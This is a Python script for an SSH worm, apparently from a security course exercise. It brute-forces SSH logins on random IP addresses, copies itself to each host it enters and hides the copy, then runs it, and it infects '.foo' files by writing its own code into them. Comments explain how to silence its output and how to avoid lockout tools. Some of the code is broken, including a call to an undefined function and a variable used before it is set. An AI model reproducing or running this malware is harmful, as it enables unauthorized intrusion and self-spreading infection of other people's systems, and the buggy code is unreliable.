#!/usr/bin/env python3
#argh

import sys
import os
import random
import paramiko
import scp
import select
import signal

##   You would want to uncomment the following two lines for the worm to
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug
               #             mode.

##  The following numbers do NOT mean that the worm will attack only 3
##  hosts for 3 different usernames and 3 different passwords.  Since the
##  worm operates in an infinite loop, at each iteration, it generates a
##  fresh batch of hosts, usernames, and passwords.
NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['user']      # need a working username for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['cs155']      # need a working username for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    print("\nwhatttt\n")
    if debug: return ['192.168.56.1','192.168.56.155']
                    # Provide one or more IP address that you
                    # want `attacked' for debugging purposes.
                    # The usrname and password you provided
                    # in the previous two functions must
                    # work on these hosts.
    if how_many is 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses


def search_signature(ssh_var,received_files):
    print("\nSearching for signature...")
    for item in received_files:
        item = item.replace("\n","")
        IN = open(item,'r')
        all_of_it = IN.readlines()
        infected_files = []
        if any(line.find('!@m$tuxn3t') for line in all_of_it):
            print("\nFound stuxnet")
            cmd = "python "+item
            infected_files.append(item)
            stdin,stdout,stderr = ssh_var.exec_command(cmd)
            count = count + 1
            if stderr is None:
                print("\nWorms executed")
    return infected_files

def execute_worm_ontarget(ssh_var,received_list):
    print("\nExecuting newly infected_files...")
    for item in received_list:
        item = item.replace("\n","")
        cmd = "python "+item
        stdin,stdout,stderr = ssh_var.exec_command(cmd)
        if stderr is None:
            print("\nWorms executed")

def send_hiddenworm_totarget(ssh_var):
    print("\nSending File...")
    scpcon = scp.SCPClient(ssh_var.get_transport())
    scpcon.put(sys.argv[0])
    scpcon.close()
    cmd_make_hidden = "mv " + sys.argv[0] + " ." + sys.argv[0]
    stdin,stdout,stderr = ssh_var.exec_command(cmd_make_hidden)
    if not stderr:
       print("\nFile hidden on target_system")

def execute_hiddenworm_ontarget(ssh_var):
    print("Executing hiddenworm...")
    cmd = "ls -ld .?*"
    stdin,stdout,stderr = ssh_var.exec_command(cmd)
    received_list = list(map(lambda x: x.encode('utf-8'),stdout.readlines()))
    
    for item in received_list:
        item = item.replace("\n","")
        execute_worm = "python "+item
        stdin,stdout,stderr = ssh_var.exec_command(execute_worm)
        delete_worm = "rm "+item 
        if stderr is None:
            print("\nDeleting hiddenworm...")
        stdin,stdout,stderr = ssh_var.exec_command(delete_worm)

# For the same IP address, we do not want to loop through multiple user
# names and passwords consecutively since we do not want to be quarantined
# by a tool like DenyHosts at the other end.  So let's reverse the order
# of looping.

while True:
    usernames = get_new_usernames(NUSERNAMES)
    print("-----",usernames)
    passwds =   get_new_passwds(NPASSWDS)
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                   
                   
                    IN = open(sys.argv[0],'r')
                    worm = [line for (i,line) in enumerate(IN)]
                    
                   
                    list_targets = "ls *.foo"
                    stdin, stdout, stderr = ssh.exec_command(list_targets)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print(received_list)
                    print("\nCalling search_signature")
                    infected_list = search_signature(ssh,received_list)
                    print("\nafter call")   
                    if not received_list:                         #if no infectable file is present then send a copy of virus, hide it, then execute
                        print("\nNo infectable targets on this system")
                        send_worm_totarget(ssh)
                        execute_hiddenworm_ontarget(ssh)
                        exit()

                    newly_infected = []
                    for item in received_list:                      #if received list exists then modify contents of each of the file and execute those
                        item = item.replace("\n","")
                        IN = open(item,'r')
                        all_of_it = IN.readlines()
                        if any(line.find('!@m$tuxn3t') for line in all_of_it): next
                        print("\nInfecting more files")
                        OUT = open(item,'w')
                        OUT.writelines(["!@m$tuxn3t"])
                        sed_cmd = "sed -i -e 's/^/#' %s" % item
                        stdin,stdout,stderr = ssh.exec_command(sed_cmd)
                        OUT.writelines(worm)
                        OUT.close()
                        newly_infected.append(item)
                    execute_worm_ontarget(ssh,newly_infected)
